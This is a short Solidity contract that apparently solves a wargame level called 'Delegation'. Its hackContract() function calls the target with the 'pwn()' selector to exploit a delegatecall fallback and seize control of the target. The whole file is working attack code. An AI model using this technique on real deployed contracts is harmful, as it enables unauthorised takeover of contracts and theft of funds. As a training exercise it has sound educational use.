// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        Delegation delegation = Delegation(contractAddress);
        address(delegation).call(abi.encodePacked((keccak256("pwn()"))));
    }
}
